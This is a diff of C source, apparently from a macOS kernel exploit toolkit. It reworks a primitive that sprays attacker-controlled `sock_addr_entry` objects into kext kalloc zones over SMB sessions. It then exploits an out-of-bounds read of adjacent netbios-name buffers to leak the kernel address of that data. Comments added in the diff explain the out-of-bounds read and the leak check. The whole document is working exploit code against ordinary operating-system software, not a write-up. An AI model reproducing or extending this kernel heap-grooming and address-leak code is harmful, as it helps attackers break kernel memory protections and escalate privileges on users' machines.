@@ -39,28 +39,21 @@ const int zone_kext_sizes[] = {
     16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
 };
 
-
-/*
- * --- Allocates memory (upto 256 bytes) from `KHEAP_KEXT` zone
- * --- Address of allocated memory can be read
- * --- Data after first 8 bytes can be controlled
- */
-
-
-// Scan the netbios name for `struct sock_addr_entry` with `addr` field
+// Scan the netbios name for `struct sock_addr_entry` with `entry->addr` pointer
+// value from zone with element size `z_elem_size`
 int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
     static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
     uint8_t sock_addr_entry_zone = 32;
     /// We  only need the data of `struct sock_addr_entry`. The netbios name consist of data from
     /// `snb_name` field of `struct sockaddr_nb` and data of succeding `struct sock_addr_entry`
     ///
-    ///         struct sockaddr_nb  (snb_len = 32)                                 struct sock_addr_entry
+    ///   struct sockaddr_nb  (allocated on 32 byte zone)                        struct sock_addr_entry
     ///  ------------------------------------------------------------------- -------------------------------------------------------------------
-    ///  | snb_len + snb_family + snb_addrin + snb_name | |      addr        +            next               +     empty    |
+    ///  | snb_len + snb_family + snb_addrin + snb_name | |      addr        +                      next                          |
     ///  ------------------------------------------------------------------- -------------------------------------------------------------------
     ///                              <=======>
     ///                               skip_bytes
-    ///                              <====================================>
+    ///                              <=============================================>
     ///                                              len
     int skip_bytes = sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name);
     int read_bytes = sizeof(struct sock_addr_entry);
@@ -69,11 +62,10 @@ int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_
     }
     
     struct sock_addr_entry entry;
-    /// Copy `addr` field to ptr
     memcpy(&entry, name + skip_bytes, sizeof(entry));
     
     uintptr_t allocated_address = (uintptr_t)entry.addr;
-    if (XE_VM_KERNEL_ADDRESS_VALID(allocated_address) && allocated_address % z_elem_size == 0) {
+    if (xe_vm_kernel_address_valid(allocated_address) && allocated_address % z_elem_size == 0) {
         *out = allocated_address;
         return 0;
     }
@@ -81,13 +73,11 @@ int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_
     return ENOENT;
 }
 
-// TODO: refactor API for clarity (first 8 bytes not controllable)
-int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
-    size_t alloc_size = data_size + 8;
-    xe_assert(alloc_size < 256);
+int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, char* data, uint8_t data_size, struct kmem_zkext_alloc_small_entry* out) {
+    xe_assert_cond(data_size, <=, alloc_size - 8);
     
     int zone_size = -1;
-    for (int i = 0; i < XE_ARRAY_SIZE(zone_kext_sizes); i++) {
+    for (int i = 0; i < xe_array_size(zone_kext_sizes); i++) {
         if (zone_kext_sizes[i] >= alloc_size) {
             zone_size = zone_kext_sizes[i];
             break;
@@ -112,7 +102,7 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         
         /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr + 8`
         error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* address_len, sa_family_t* address_family, char** arbitary_data, size_t* arbitary_data_len, size_t index) {
-            *address_len = data_size + 8;
+            *address_len = alloc_size;
             *address_family = AF_INET;
             *arbitary_data = data;
             *arbitary_data_len = data_size;
@@ -153,14 +143,19 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
         params.laddr_ioc_len = ioc_len;
         params.laddr_snb_name_seglen = snb_name;
         
+        /// Allocate saddr and laddr in `kext.kalloc.32` zone and read their succeeding zone element
         kmem_neighbor_reader_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
         xe_assert_cond(server_name_size, ==, snb_name + 2);
         xe_assert_cond(local_name_size, ==, snb_name + 2);
         
+        /// Check if OOB read of saddr is a value of type `struct sock_addr_entry` having field `addr`
+        /// from zone with element size `zone_size`
         if (!kmem_zkext_alloc_small_scan_nb_name(server_nb_name, sizeof(server_nb_name), zone_size, &value)) {
             break;
         }
         
+        /// Check if OOB read of laddr is a value of type `struct sock_addr_entry` having field `addr`
+        /// from zone with element size `zone_size`
         if (!kmem_zkext_alloc_small_scan_nb_name(local_nb_name, sizeof(local_nb_name), zone_size, &value)) {
             break;
         }
@@ -177,11 +172,11 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
 }
 
 
-struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
+struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, uint8_t alloc_size, char* data, uint8_t data_size) {
     for (int i = 0; i < MAX_SESSIONS; i++) {
         xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
         struct kmem_zkext_alloc_small_entry entry;
-        int error = kmem_zkext_alloc_small_try(smb_addr, data, data_size, &entry);
+        int error = kmem_zkext_alloc_small_try(smb_addr, alloc_size, data, data_size, &entry);
         if (!error) {
             return entry;
         }
